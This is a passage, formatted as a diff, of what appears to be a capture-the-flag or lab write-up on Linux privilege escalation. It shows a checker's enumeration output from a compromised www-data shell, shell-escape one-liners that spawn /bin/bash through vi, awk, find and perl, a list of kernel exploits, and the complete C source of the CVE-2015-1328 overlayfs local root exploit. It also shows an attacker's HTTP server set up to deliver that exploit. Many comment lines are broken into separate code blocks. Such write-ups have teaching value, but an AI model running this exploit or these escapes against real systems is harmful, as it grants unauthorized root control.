@@ -2277,3 +2277,1143 @@ LINUX PRIVILEGE ESCALATION CHECKER
     root 21 09:47 0:00 [rcuos/13]
     root 22 09:47 0:00 [rcuos/14]
     root 23 09:47 0:00 [rcu_bh]
+    root 24 09:47 0:00 [rcuob/0]
+    root 25 09:47 0:00 [rcuob/1]
+    root 26 09:47 0:00 [rcuob/2]
+    root 27 09:47 0:00 [rcuob/3]
+    root 28 09:47 0:00 [rcuob/4]
+    root 29 09:47 0:00 [rcuob/5]
+    root 30 09:47 0:00 [rcuob/6]
+    root 31 09:47 0:00 [rcuob/7]
+    root 32 09:47 0:00 [rcuob/8]
+    root 33 09:47 0:00 [rcuob/9]
+    root 34 09:47 0:00 [rcuob/10]
+    root 35 09:47 0:00 [rcuob/11]
+    root 36 09:47 0:00 [rcuob/12]
+    root 37 09:47 0:00 [rcuob/13]
+    root 38 09:47 0:00 [rcuob/14]
+    root 39 09:47 0:00 [migration/0]
+    root 40 09:47 0:00 [watchdog/0]
+    root 41 09:47 0:00 [khelper]
+    root 42 09:47 0:00 [kdevtmpfs]
+    root 43 09:47 0:00 [netns]
+    root 44 09:47 0:00 [xenwatch]
+    root 45 09:47 0:00 [xenbus]
+    root 46 09:47 0:00 [kworker/0:1]
+    root 47 09:47 0:00 [writeback]
+    root 48 09:47 0:00 [kintegrityd]
+    root 49 09:47 0:00 [bioset]
+    root 50 09:47 0:00 [kworker/u31:0]
+    root 51 09:47 0:00 [kblockd]
+    root 52 09:47 0:00 [ata_sff]
+    root 53 09:47 0:00 [khubd]
+    root 54 09:47 0:00 [md]
+    root 55 09:47 0:00 [devfreq_wq]
+    root 57 09:47 0:00 [khungtaskd]
+    root 58 09:47 0:00 [kswapd0]
+    root 59 09:47 0:00 [ksmd]
+    root 60 09:47 0:00 [fsnotify_mark]
+    root 61 09:47 0:00 [ecryptfs-kthrea]
+    root 62 09:47 0:00 [crypto]
+    root 74 09:47 0:00 [kthrotld]
+    root 75 09:47 0:00 [kworker/u30:1]
+    root 76 09:47 0:00 [scsi_eh_0]
+    root 77 09:47 0:00 [scsi_eh_1]
+    root 98 09:47 0:00 [deferwq]
+    root 99 09:47 0:00 [charger_manager]
+    root 144 09:47 0:00 [kpsmoused]
+    root 153 09:47 0:00 [jbd2/xvda1-8]
+    root 154 09:47 0:00 [ext4-rsv-conver]
+    root 168 09:47 0:00 [kworker/0:2]
+    root 333 09:47 0:01 upstart-udev-bridge
+    root 352 09:47 0:00 /lib/systemd/systemd-udevd
+    message+ 362 09:47 0:00 dbus-daemon
+    root 408 09:47 0:00 /lib/systemd/systemd-logind
+    root 411 09:47 0:00 upstart-file-bridge
+    syslog 414 09:47 0:00 rsyslogd
+    root 567 09:47 0:00 dhclient
+    root 615 09:47 0:00 upstart-socket-bridge
+    root 790 09:47 0:00 /sbin/getty
+    root 792 09:47 0:00 /sbin/getty
+    root 794 09:47 0:00 /sbin/getty
+    root 795 09:47 0:00 /sbin/getty
+    root 798 09:47 0:00 /sbin/getty
+    root 829 09:47 0:00 /usr/sbin/dovecot
+    root 830 09:47 0:00 cron
+    dovecot 840 09:47 0:00 dovecot/anvil
+    root 841 09:47 0:00 dovecot/log
+    postgres 863 09:47 0:00 /usr/lib/postgresql/9.3/bin/postgres
+    postgres 869 09:48 0:00 postgres:
+    postgres 870 09:48 0:00 postgres:
+    postgres 871 09:48 0:00 postgres:
+    postgres 872 09:48 0:00 postgres:
+    postgres 873 09:48 0:00 postgres:
+    root 1001 09:48 0:00 /usr/lib/postfix/master
+    postfix 1018 09:48 0:00 qmgr
+    root 1072 09:48 0:00 /usr/sbin/apache2
+    www-data 1079 09:48 0:00 /usr/sbin/apache2
+    www-data 1081 09:48 0:00 /usr/sbin/apache2
+    www-data 1082 09:48 0:00 /usr/sbin/apache2
+    www-data 1083 09:48 0:00 /usr/sbin/apache2
+    root 1109 09:48 0:00 /sbin/getty
+    postfix 1131 09:59 0:00 tlsmgr
+    root 1182 10:09 0:00 [kauditd]
+    www-data 1916 10:57 0:00 /usr/sbin/apache2
+    www-data 1917 10:57 0:00 /usr/sbin/apache2
+    www-data 1922 10:57 0:00 /usr/sbin/apache2
+    www-data 1926 10:57 0:00 /usr/sbin/apache2
+    www-data 2225 11:13 0:00 /usr/sbin/apache2
+    www-data 2229 11:13 0:00 /usr/sbin/apache2
+    postgres 2273 11:25 0:00 postgres:
+    www-data 2274 11:25 0:00 sh
+    www-data 2276 11:25 0:00 python
+    www-data 2277 11:25 0:00 /bin/bash
+    www-data 2281 11:25 0:00 python
+    www-data 2282 11:25 0:00 /bin/bash
+    www-data 2289 11:27 0:00 /usr/sbin/apache2
+    postfix 2292 11:28 0:00 pickup
+    www-data 2301 11:30 0:00 python
+    www-data 3084 11:30 0:00 /bin/sh
+    www-data 3085 11:30 0:00 ps
+    www-data 3086 11:30 0:00 awk
+
+[+] Apache Version and Modules
+    Server version: Apache/2.4.7 (Ubuntu)
+    Server built:   Apr 18 2018 15:36:26
+    Loaded Modules:
+    core_module (static)
+    so_module (static)
+    watchdog_module (static)
+    http_module (static)
+    log_config_module (static)
+    logio_module (static)
+    version_module (static)
+    unixd_module (static)
+    access_compat_module (shared)
+    alias_module (shared)
+    auth_basic_module (shared)
+    authn_core_module (shared)
+    authn_file_module (shared)
+    authz_core_module (shared)
+    authz_host_module (shared)
+    authz_user_module (shared)
+    autoindex_module (shared)
+    deflate_module (shared)
+    dir_module (shared)
+    env_module (shared)
+    filter_module (shared)
+    mime_module (shared)
+    mpm_prefork_module (shared)
+    negotiation_module (shared)
+    php5_module (shared)
+    setenvif_module (shared)
+    status_module (shared)
+    Compiled in modules:
+    core.c
+    mod_so.c
+    mod_watchdog.c
+    http_core.c
+    mod_log_config.c
+    mod_logio.c
+    mod_version.c
+    mod_unixd.c
+
+[+] Apache Config File
+```
+```text
+# This is the main Apache server configuration file.  It contains the
+```
+```text
+# configuration directives that give the server its instructions.
+```
+```text
+# See http://httpd.apache.org/docs/2.4/ for detailed information about
+```
+```text
+# the directives and /usr/share/doc/apache2/README.Debian about Debian specific
+```
+```text
+# hints.
+    #
+    #
+```
+```text
+# Summary of how the Apache 2 configuration works in Debian:
+```
+```text
+# The Apache 2 web server configuration in Debian is quite different to
+```
+```text
+# upstream's suggested way to configure the web server. This is because Debian's
+```
+```text
+# default Apache2 installation attempts to make adding and removing modules,
+```
+```text
+# virtual hosts, and extra configuration directives as flexible as possible, in
+```
+```text
+# order to make automating the changes and administering the server as easy as
+```
+```text
+# possible.
+```
+```text
+# It is split into several files forming the configuration hierarchy outlined
+```
+```text
+# below, all located in the /etc/apache2/ directory:
+    #
+    #	/etc/apache2/
+    #	|-- apache2.conf
+    #	|	`--  ports.conf
+    #	|-- mods-enabled
+    #	|	|-- *.load
+    #	|	`-- *.conf
+    #	|-- conf-enabled
+    #	|	`-- *.conf
+```
+```text
+# 	`-- sites-enabled
+    #	 	`-- *.conf
+    #
+    #
+```
+```text
+# * apache2.conf is the main configuration file (this file). It puts the pieces
+```
+```text
+#   together by including all remaining configuration files when starting up the
+```
+```text
+#   web server.
+    #
+```
+```text
+# * ports.conf is always included from the main configuration file. It is
+```
+```text
+#   supposed to determine listening ports for incoming connections which can be
+```
+```text
+#   customized anytime.
+    #
+```
+```text
+# * Configuration files in the mods-enabled/, conf-enabled/ and sites-enabled/
+```
+```text
+#   directories contain particular configuration snippets which manage modules,
+```
+```text
+#   global configuration fragments, or virtual host configurations,
+```
+```text
+#   respectively.
+    #
+```
+```text
+#   They are activated by symlinking available configuration files from their
+```
+```text
+#   respective *-available/ counterparts. These should be managed by using our
+```
+```text
+#   helpers a2enmod/a2dismod, a2ensite/a2dissite and a2enconf/a2disconf. See
+```
+```text
+#   their respective man pages for detailed information.
+    #
+```
+```text
+# * The binary is called apache2. Due to the use of environment variables, in
+```
+```text
+#   the default configuration, apache2 needs to be started/stopped with
+```
+```text
+#   /etc/init.d/apache2 or apache2ctl. Calling /usr/bin/apache2 directly will not
+```
+```text
+#   work with the default configuration.
+```
+```text
+# Global configuration
+    #
+    #
+```
+```text
+# ServerRoot: The top of the directory tree under which the server's
+```
+```text
+# configuration, error, and log files are kept.
+    #
+```
+```text
+# NOTE!  If you intend to place this on an NFS (or otherwise network)
+```
+```text
+# mounted filesystem then please read the Mutex documentation (available
+```
+```text
+# at <URL:http://httpd.apache.org/docs/2.4/mod/core.html#mutex>);
+```
+```text
+# you will save yourself a lot of trouble.
+    #
+```
+```text
+# Do NOT add a slash at the end of the directory path.
+    #
+    #ServerRoot "/etc/apache2"
+    #
+```
+```text
+# The accept serialization lock file MUST BE STORED ON A LOCAL DISK.
+    #
+    Mutex file:${APACHE_LOCK_DIR} default
+    #
+```
+```text
+# PidFile: The file in which the server should record its process
+```
+```text
+# identification number when it starts.
+```
+```text
+# This needs to be set in /etc/apache2/envvars
+    #
+    PidFile ${APACHE_PID_FILE}
+    #
+```
+```text
+# Timeout: The number of seconds before receives and sends time out.
+    #
+    Timeout 300
+    #
+```
+```text
+# KeepAlive: Whether or not to allow persistent connections (more than
+```
+```text
+# one request per connection). Set to "Off" to deactivate.
+    #
+    KeepAlive On
+    #
+```
+```text
+# MaxKeepAliveRequests: The maximum number of requests to allow
+```
+```text
+# during a persistent connection. Set to 0 to allow an unlimited amount.
+```
+```text
+# We recommend you leave this number high, for maximum performance.
+    #
+    MaxKeepAliveRequests 100
+    #
+```
+```text
+# KeepAliveTimeout: Number of seconds to wait for the next request from the
+```
+```text
+# same client on the same connection.
+    #
+    KeepAliveTimeout 5
+```
+```text
+# These need to be set in /etc/apache2/envvars
+    User ${APACHE_RUN_USER}
+    Group ${APACHE_RUN_GROUP}
+    #
+```
+```text
+# HostnameLookups: Log the names of clients or just their IP addresses
+```
+```text
+# e.g., www.apache.org (on) or 204.62.129.132 (off).
+```
+```text
+# The default is off because it'd be overall better for the net if people
+```
+```text
+# had to knowingly turn this feature on, since enabling it means that
+```
+```text
+# each client request will result in AT LEAST one lookup request to the
+```
+```text
+# nameserver.
+    #
+    HostnameLookups Off
+```
+```text
+# ErrorLog: The location of the error log file.
+```
+```text
+# If you do not specify an ErrorLog directive within a <VirtualHost>
+```
+```text
+# container, error messages relating to that virtual host will be
+```
+```text
+# logged here.  If you *do* define an error logfile for a <VirtualHost>
+```
+```text
+# container, that host's errors will be logged there and not here.
+    #
+    ErrorLog ${APACHE_LOG_DIR}/error.log
+    #
+```
+```text
+# LogLevel: Control the severity of messages logged to the error_log.
+```
+```text
+# Available values: trace8, ..., trace1, debug, info, notice, warn,
+```
+```text
+# error, crit, alert, emerg.
+```
+```text
+# It is also possible to configure the log level for particular modules, e.g.
+```
+```text
+# "LogLevel info ssl:warn"
+    #
+    LogLevel warn
+```
+```text
+# Include module configuration:
+    IncludeOptional mods-enabled/*.load
+    IncludeOptional mods-enabled/*.conf
+```
+```text
+# Include list of ports to listen on
+    Include ports.conf
+```
+```text
+# Sets the default security model of the Apache2 HTTPD server. It does
+```
+```text
+# not allow access to the root filesystem outside of /usr/share and /var/www.
+```
+```text
+# The former is used by web applications packaged in Debian,
+```
+```text
+# the latter may be used for local directories served by the web server. If
+```
+```text
+# your system is serving content from a sub-directory in /srv you must allow
+```
+```text
+# access here, or in any related virtual host.
+    <Directory />
+    Options FollowSymLinks
+    AllowOverride None
+    Require all denied
+    </Directory>
+    <Directory /usr/share>
+    AllowOverride None
+    Require all granted
+    </Directory>
+    <Directory /var/www/>
+    Options Indexes FollowSymLinks
+    AllowOverride All
+    Require all granted
+    </Directory>
+    #<Directory /srv/>
+    #	Options Indexes FollowSymLinks
+    #	AllowOverride None
+    #	Require all granted
+    #</Directory>
+```
+```text
+# AccessFileName: The name of the file to look for in each directory
+```
+```text
+# for additional configuration directives.  See also the AllowOverride
+```
+```text
+# directive.
+    #
+    AccessFileName .htaccess
+    #
+```
+```text
+# The following lines prevent .htaccess and .htpasswd files from being
+```
+```text
+# viewed by Web clients.
+    #
+    <FilesMatch "^\.ht">
+    Require all denied
+    </FilesMatch>
+    #
+```
+```text
+# The following directives define some format nicknames for use with
+```
+```text
+# a CustomLog directive.
+    #
+```
+```text
+# These deviate from the Common Log Format definitions in that they use %O
+```
+```text
+# (the actual bytes sent including headers) instead of %b (the size of the
+```
+```text
+# requested file), because the latter makes it impossible to detect partial
+```
+```text
+# requests.
+    #
+```
+```text
+# Note that the use of %{X-Forwarded-For}i instead of %h is not recommended.
+```
+```text
+# Use mod_remoteip instead.
+    #
+    LogFormat "%v:%p %h %l %u %t \"%r\" %>s %O \"%{Referer}i\" \"%{User-Agent}i\"" vhost_combined
+    LogFormat "%h %l %u %t \"%r\" %>s %O \"%{Referer}i\" \"%{User-Agent}i\"" combined
+    LogFormat "%h %l %u %t \"%r\" %>s %O" common
+    LogFormat "%{Referer}i -> %U" referer
+    LogFormat "%{User-agent}i" agent
+```
+```text
+# Include of directories ignores editors' and dpkg's backup files,
+```
+```text
+# see README.Debian for details.
+```
+```text
+# Include generic snippets of statements
+    IncludeOptional conf-enabled/*.conf
+```
+```text
+# Include the virtual host configurations:
+    IncludeOptional sites-enabled/*.conf
+```
+```text
+# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
+
+[+] Sudo Version (Check out http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=sudo)
+    Sudo version 1.8.9p5
+    Sudoers policy plugin version 1.8.9p5
+    Sudoers file grammar version 43
+    Sudoers I/O plugin version 1.8.9p5
+
+[*] IDENTIFYING PROCESSES AND PACKAGES RUNNING AS ROOT OR OTHER SUPERUSER...
+
+    root 1001 09:48 0:00 /usr/lib/postfix/master
+        Possible Related Packages: 
+             base-passwd 3.5.33  Debian base system master password and group files
+    root 144 09:47 0:00 [kpsmoused]
+    root 1182 10:09 0:00 [kauditd]
+    root 40 09:47 0:00 [watchdog/0]
+    root 46 09:47 0:00 [kworker/0:1]
+    root 59 09:47 0:00 [ksmd]
+    root 567 09:47 0:00 dhclient
+    root 13 09:47 0:00 [rcuos/5]
+    root 34 09:47 0:00 [rcuob/10]
+    root 33 09:47 0:00 [rcuob/9]
+    root 27 09:47 0:00 [rcuob/3]
+    root 333 09:47 0:01 upstart-udev-bridge
+    root 10 09:47 0:00 [rcuos/2]
+    root 411 09:47 0:00 upstart-file-bridge
+    root 15 09:47 0:00 [rcuos/7]
+    root 39 09:47 0:00 [migration/0]
+    root 829 09:47 0:00 /usr/sbin/dovecot
+        Possible Related Packages: 
+             dovecot-core 1:2.2.9-1ubuntu2.4  secure POP3/IMAP server - core files
+             dovecot-pop3d 1:2.2.9-1ubuntu2.4  secure POP3/IMAP server - POP3 daemon
+    root 790 09:47 0:00 /sbin/getty
+    root 54 09:47 0:00 [md]
+    root 47 09:47 0:00 [writeback]
+    root 25 09:47 0:00 [rcuob/1]
+    root 2 09:47 0:00 [kthreadd]
+    root 52 09:47 0:00 [ata_sff]
+    root 14 09:47 0:00 [rcuos/6]
+    root 76 09:47 0:00 [scsi_eh_0]
+    root 1109 09:48 0:00 /sbin/getty
+    root 21 09:47 0:00 [rcuos/13]
+    root 19 09:47 0:00 [rcuos/11]
+    root 5 09:47 0:00 [kworker/0:0H]
+    root 30 09:47 0:00 [rcuob/6]
+    root 408 09:47 0:00 /lib/systemd/systemd-logind
+    root 8 09:47 0:00 [rcuos/0]
+    root 98 09:47 0:00 [deferwq]
+    root 830 09:47 0:00 cron
+        Possible Related Packages: 
+             cron 3.0pl1-124ubuntu2  process scheduling daemon
+    root 7 09:47 0:00 [rcu_sched]
+    root 57 09:47 0:00 [khungtaskd]
+    root 36 09:47 0:00 [rcuob/12]
+    root 22 09:47 0:00 [rcuos/14]
+    root 9 09:47 0:00 [rcuos/1]
+    root 58 09:47 0:00 [kswapd0]
+    root 44 09:47 0:00 [xenwatch]
+    root 23 09:47 0:00 [rcu_bh]
+    root 17 09:47 0:00 [rcuos/9]
+    root 29 09:47 0:00 [rcuob/5]
+    root 6 09:47 0:00 [kworker/u30:0]
+    root 153 09:47 0:00 [jbd2/xvda1-8]
+    root 3 09:47 0:00 [ksoftirqd/0]
+    root 41 09:47 0:00 [khelper]
+    root 28 09:47 0:00 [rcuob/4]
+    root 60 09:47 0:00 [fsnotify_mark]
+    root 12 09:47 0:00 [rcuos/4]
+    root 1 09:47 0:05 /sbin/init
+        Possible Related Packages: 
+             busybox-initramfs 1:1.21.0-1ubuntu1  Standalone shell setup for initramfs
+             init-system-helpers 1.14  helper tools for all init systems
+             initramfs-tools 0.103ubuntu4.2  tools for generating an initramfs
+             initramfs-tools-bin 0.103ubuntu4.2  binaries used by initramfs-tools
+             initscripts 2.88dsf-41ubuntu6  scripts for initializing and shutting down the system
+             insserv 1.14.0-5ubuntu2  boot sequence organizer using LSB init.d script dependency information
+             libklibc 2.0.3-0ubuntu1  minimal libc subset for use with initramfs
+             lsb-base 4.1+Debian11ubuntu6  Linux Standard Base 4.1 init script functionality
+             module-init-tools 15-0ubuntu6  transitional dummy package (module-init-tools to kmod)
+             ncurses-base 5.9+20140118-1ubuntu1  basic terminal type definitions
+             sysvinit-utils 2.88dsf-41ubuntu6  System-V-like utilities
+             upstart 1.12.1-0ubuntu4.2  event-based init daemon
+    root 48 09:47 0:00 [kintegrityd]
+    root 1072 09:48 0:00 /usr/sbin/apache2
+        Possible Related Packages: 
+             apache2 2.4.7-1ubuntu4.20  Apache HTTP Server
+             apache2-bin 2.4.7-1ubuntu4.20  Apache HTTP Server (binary files and modules)
+             apache2-data 2.4.7-1ubuntu4.20  Apache HTTP Server (common files)
+             apache2-utils 2.4.7-1ubuntu4.20  Apache HTTP Server (utility programs for web servers)
+             libapache2-mod-php5 5.5.9+dfsg-1ubuntu4.24  server-side, HTML-embedded scripting language (Apache 2 module)
+    root 38 09:47 0:00 [rcuob/14]
+    root 99 09:47 0:00 [charger_manager]
+    root 352 09:47 0:00 /lib/systemd/systemd-udevd
+    root 26 09:47 0:00 [rcuob/2]
+    root 20 09:47 0:00 [rcuos/12]
+    root 841 09:47 0:00 dovecot/log
+        Possible Related Packages: 
+             libllvm3.4:amd64 1:3.4-1ubuntu3  Modular compiler and toolchain technologies, runtime library
+             liblog-message-simple-perl 0.10-1  simplified interface to Log::Message
+             libparse-debianchangelog-perl 1.2.0-1ubuntu1  parse Debian changelogs and output them in other formats
+             libplymouth2:amd64 0.8.8-0ubuntu17  graphical boot animation and logger - shared libraries
+             libsystemd-login0:amd64 204-5ubuntu20.3  systemd login utility library
+             llvm-3.4 1:3.4-1ubuntu3  Modular compiler and toolchain technologies
+             llvm-3.4-dev 1:3.4-1ubuntu3  Modular compiler and toolchain technologies, libraries and headers
+             llvm-3.4-runtime 1:3.4-1ubuntu3  Modular compiler and toolchain technologies, IR interpreter
+             login 1:4.1.5.1-1ubuntu9  system login tools
+             logrotate 3.8.7-1ubuntu1  Log rotation utility
+             plymouth 0.8.8-0ubuntu17  graphical boot animation and logger - main package
+             plymouth-theme-ubuntu-text 0.8.8-0ubuntu17  graphical boot animation and logger - ubuntu-logo theme
+             rsyslog 7.4.4-1ubuntu2  reliable system and kernel logging daemon
+             sgml-base 1.26+nmu4ubuntu1  SGML infrastructure and SGML catalog file support
+             whiptail 0.52.15-2ubuntu5  Displays user-friendly dialog boxes from shell scripts
+             xml-core 0.13+nmu2  XML infrastructure and XML catalog file support
+    root 794 09:47 0:00 /sbin/getty
+    root 11 09:47 0:00 [rcuos/3]
+    root 77 09:47 0:00 [scsi_eh_1]
+    root 42 09:47 0:00 [kdevtmpfs]
+    root 168 09:47 0:00 [kworker/0:2]
+    root 31 09:47 0:00 [rcuob/7]
+    root 792 09:47 0:00 /sbin/getty
+    root 45 09:47 0:00 [xenbus]
+    root 75 09:47 0:00 [kworker/u30:1]
+    root 18 09:47 0:00 [rcuos/10]
+    root 795 09:47 0:00 /sbin/getty
+    root 53 09:47 0:00 [khubd]
+    root 798 09:47 0:00 /sbin/getty
+    root 615 09:47 0:00 upstart-socket-bridge
+    root 49 09:47 0:00 [bioset]
+    root 50 09:47 0:00 [kworker/u31:0]
+    root 61 09:47 0:00 [ecryptfs-kthrea]
+    root 51 09:47 0:00 [kblockd]
+    root 35 09:47 0:00 [rcuob/11]
+    root 43 09:47 0:00 [netns]
+    root 16 09:47 0:00 [rcuos/8]
+    root 62 09:47 0:00 [crypto]
+    root 37 09:47 0:00 [rcuob/13]
+    root 55 09:47 0:00 [devfreq_wq]
+    root 74 09:47 0:00 [kthrotld]
+    root 32 09:47 0:00 [rcuob/8]
+    root 24 09:47 0:00 [rcuob/0]
+    root 154 09:47 0:00 [ext4-rsv-conver]
+
+[*] ENUMERATING INSTALLED LANGUAGES/TOOLS FOR SPLOIT BUILDING...
+
+[+] Installed Tools
+    /usr/bin/awk
+    /usr/bin/perl
+    /usr/bin/python
+    /usr/bin/cc
+    /usr/bin/vi
+    /usr/bin/vim
+    /usr/bin/find
+    /bin/netcat
+    /bin/nc
+    /usr/bin/wget
+    /usr/bin/ftp
+
+[+] Related Shell Escape Sequences...
+
+    vi-->	:!bash
+    vi-->	:set shell=/bin/bash:shell
+    vi-->	:!bash
+    vi-->	:set shell=/bin/bash:shell
+    awk-->	awk 'BEGIN {system("/bin/bash")}'
+    find-->	find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' \;
+    perl-->	perl -e 'exec "/bin/bash";'
+
+[*] FINDING RELEVENT PRIVILEGE ESCALATION EXPLOITS...
+
+    Note: Exploits relying on a compile/scripting language not detected on this system are marked with a '**' but should still be tested!
+
+    The following exploits are ranked higher in probability of success because this script detected a related running process, OS, or mounted file system
+
+    The following exploits are applicable to this kernel version and should be investigated as well
+    - Kernel ia32syscall Emulation Privilege Escalation || http://www.exploit-db.com/exploits/15023 || Language=c
+    - Sendpage Local Privilege Escalation || http://www.exploit-db.com/exploits/19933 || Language=ruby**
+    - CAP_SYS_ADMIN to Root Exploit 2 (32 and 64-bit) || http://www.exploit-db.com/exploits/15944 || Language=c
+    - CAP_SYS_ADMIN to root Exploit || http://www.exploit-db.com/exploits/15916 || Language=c
+    - MySQL 4.x/5.0 User-Defined Function Local Privilege Escalation Exploit || http://www.exploit-db.com/exploits/1518 || Language=c
+    - open-time Capability file_ns_capable() Privilege Escalation || http://www.exploit-db.com/exploits/25450 || Language=c
+    - open-time Capability file_ns_capable() - Privilege Escalation Vulnerability || http://www.exploit-db.com/exploits/25307 || Language=c
+
+Finished
+=================================================================================================
+www-data@ubuntu:/tmp$ 
+
+www-data@ubuntu:/tmp$ uname -a
+uname -a
+Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
+```
+```text
+┌──(kali㉿kali)-[~/Downloads]
+└─$ searchsploit 3.13 ubuntu
+---------------------------------------------- ---------------------------------
+ Exploit Title                                |  Path
+---------------------------------------------- ---------------------------------
+Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.0 | linux/local/37292.c
+```
+```text
+┌──(kali㉿kali)-[~/Downloads]
+└─$ searchsploit -m linux/local/37292.c 
+  Exploit: Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation
+      URL: https://www.exploit-db.com/exploits/37292
+     Path: /usr/share/exploitdb/exploits/linux/local/37292.c
+    Codes: CVE-2015-1328
+ Verified: True
+File Type: C source, ASCII text, with very long lines (466)
+Copied to: /home/kali/Downloads/37292.c
+```
+```text
+┌──(kali㉿kali)-[~/Downloads]
+└─$ cat 37292.c      
+/*
+```
+```text
+# Exploit Title: ofs.c - overlayfs local root in ubuntu
+```
+```text
+# Date: 2015-06-15
+```
+```text
+# Exploit Author: rebel
+```
+```text
+# Version: Ubuntu 12.04, 14.04, 14.10, 15.04 (Kernels before 2015-06-15)
+```
+```text
+# Tested on: Ubuntu 12.04, 14.04, 14.10, 15.04
+```
+```text
+# CVE : CVE-2015-1328     (http://people.canonical.com/~ubuntu-security/cve/2015/CVE-2015-1328.html)
+
+*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*
+CVE-2015-1328 / ofs.c
+overlayfs incorrect permission handling + FS_USERNS_MOUNT
+
+user@ubuntu-server-1504:~$ uname -a
+Linux ubuntu-server-1504 3.19.0-18-generic #18-Ubuntu SMP Tue May 19 18:31:35 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
+user@ubuntu-server-1504:~$ gcc ofs.c -o ofs
+user@ubuntu-server-1504:~$ id
+uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),30(dip),46(plugdev)
+user@ubuntu-server-1504:~$ ./ofs
+spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+creating shared library
+```
+```text
+# id
+uid=0(root) gid=0(root) groups=0(root),24(cdrom),30(dip),46(plugdev),1000(user)
+
+greets to beist & kaliman
+2015-05-24
+%rebel%
+*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sched.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <sys/mount.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sched.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <sys/mount.h>
+#include <sys/types.h>
+#include <signal.h>
+#include <fcntl.h>
+#include <string.h>
+#include <linux/sched.h>
+
+#define LIB "#include <unistd.h>\n\nuid_t(*_real_getuid) (void);\nchar path[128];\n\nuid_t\ngetuid(void)\n{\n_real_getuid = (uid_t(*)(void)) dlsym((void *) -1, \"getuid\");\nreadlink(\"/proc/self/exe\", (char *) &path, 128);\nif(geteuid() == 0 && !strcmp(path, \"/bin/su\")) {\nunlink(\"/etc/ld.so.preload\");unlink(\"/tmp/ofs-lib.so\");\nsetresuid(0, 0, 0);\nsetresgid(0, 0, 0);\nexecle(\"/bin/sh\", \"sh\", \"-i\", NULL, NULL);\n}\n    return _real_getuid();\n}\n"
+
+static char child_stack[1024*1024];
+
+static int
+child_exec(void *stuff)
+{
+    char *file;
+    system("rm -rf /tmp/ns_sploit");
+    mkdir("/tmp/ns_sploit", 0777);
+    mkdir("/tmp/ns_sploit/work", 0777);
+    mkdir("/tmp/ns_sploit/upper",0777);
+    mkdir("/tmp/ns_sploit/o",0777);
+
+    fprintf(stderr,"mount #1\n");
+    if (mount("overlay", "/tmp/ns_sploit/o", "overlayfs", MS_MGC_VAL, "lowerdir=/proc/sys/kernel,upperdir=/tmp/ns_sploit/upper") != 0) {
+// workdir= and "overlay" is needed on newer kernels, also can't use /proc as lower
+        if (mount("overlay", "/tmp/ns_sploit/o", "overlay", MS_MGC_VAL, "lowerdir=/sys/kernel/security/apparmor,upperdir=/tmp/ns_sploit/upper,workdir=/tmp/ns_sploit/work") != 0) {
+            fprintf(stderr, "no FS_USERNS_MOUNT for overlayfs on this kernel\n");
+            exit(-1);
+        }
+        file = ".access";
+        chmod("/tmp/ns_sploit/work/work",0777);
+    } else file = "ns_last_pid";
+
+    chdir("/tmp/ns_sploit/o");
+    rename(file,"ld.so.preload");
+
+    chdir("/");
+    umount("/tmp/ns_sploit/o");
+    fprintf(stderr,"mount #2\n");
+    if (mount("overlay", "/tmp/ns_sploit/o", "overlayfs", MS_MGC_VAL, "lowerdir=/tmp/ns_sploit/upper,upperdir=/etc") != 0) {
+        if (mount("overlay", "/tmp/ns_sploit/o", "overlay", MS_MGC_VAL, "lowerdir=/tmp/ns_sploit/upper,upperdir=/etc,workdir=/tmp/ns_sploit/work") != 0) {
+            exit(-1);
+        }
+        chmod("/tmp/ns_sploit/work/work",0777);
+    }
+
+    chmod("/tmp/ns_sploit/o/ld.so.preload",0777);
+    umount("/tmp/ns_sploit/o");
+}
+
+int
+main(int argc, char **argv)
+{
+    int status, fd, lib;
+    pid_t wrapper, init;
+    int clone_flags = CLONE_NEWNS | SIGCHLD;
+
+    fprintf(stderr,"spawning threads\n");
+
+    if((wrapper = fork()) == 0) {
+        if(unshare(CLONE_NEWUSER) != 0)
+            fprintf(stderr, "failed to create new user namespace\n");
+
+        if((init = fork()) == 0) {
+            pid_t pid =
+                clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);
+            if(pid < 0) {
+                fprintf(stderr, "failed to create new mount namespace\n");
+                exit(-1);
+            }
+
+            waitpid(pid, &status, 0);
+
+        }
+
+        waitpid(init, &status, 0);
+        return 0;
+    }
+
+    usleep(300000);
+
+    wait(NULL);
+
+    fprintf(stderr,"child threads done\n");
+
+    fd = open("/etc/ld.so.preload",O_WRONLY);
+
+    if(fd == -1) {
+        fprintf(stderr,"exploit failed\n");
+        exit(-1);
+    }
+
+    fprintf(stderr,"/etc/ld.so.preload created\n");
+    fprintf(stderr,"creating shared library\n");
+    lib = open("/tmp/ofs-lib.c",O_CREAT|O_WRONLY,0777);
+    write(lib,LIB,strlen(LIB));
+    close(lib);
+    lib = system("gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w");
+    if(lib != 0) {
+        fprintf(stderr,"couldn't create dynamic library\n");
+        exit(-1);
+    }
+    write(fd,"/tmp/ofs-lib.so\n",16);
+    close(fd);
+    system("rm -rf /tmp/ns_sploit /tmp/ofs-lib.c");
+    execl("/bin/su","su",NULL);
+}   
+
+www-data@ubuntu:/tmp$ which gcc
+which gcc
+www-data@ubuntu:/tmp$ which cc
+which cc
+/usr/bin/cc
+```
+```text
+┌──(kali㉿kali)-[~/Downloads]
+└─$ python3 -m http.server 8000        
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
